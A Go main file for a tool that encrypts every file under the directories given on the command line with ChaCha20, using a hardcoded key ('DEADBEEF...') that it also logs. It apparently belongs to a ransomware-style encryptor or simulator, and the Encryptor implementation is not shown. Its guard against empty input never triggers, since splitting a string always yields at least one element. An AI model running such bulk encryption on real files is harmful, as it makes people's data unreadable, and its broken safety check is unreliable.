package main

import (
	"flag"
	"log"
	"os"
	"strings"
)

func main() {
	var encrypt_dirs string
	flag.StringVar(&encrypt_dirs, "encrypt_dirs", "", "Comma-separated list of directories to encrypt")
	flag.Parse()

	dirs := strings.Split(encrypt_dirs, ", ")
	//yeah we're not gonna encrypt unless explicitly requested
	if len(dirs) == 0 {
		flag.Usage()
		os.Exit(1)
	}

	workerCount := 5
	encryptor := Encryptor{
		Key:            []byte(`DEADBEEFDEADBEEFDEADBEEFDEADBEEF`),
		EncryptionChan: make(chan string),
		JobChan:        make(chan string, workerCount),
		ErrChan:        make(chan error),
		Done:           make(chan struct{}),
		WorkerCount:    workerCount,
	}

	encryptor.EnumerateDirectories(dirs)

	log.Printf("encrypting files with chacha20 stream cipher\nkey: %s\n", encryptor.Key)
	log.Fatal(encryptor.ListenAndEncrypt())
}
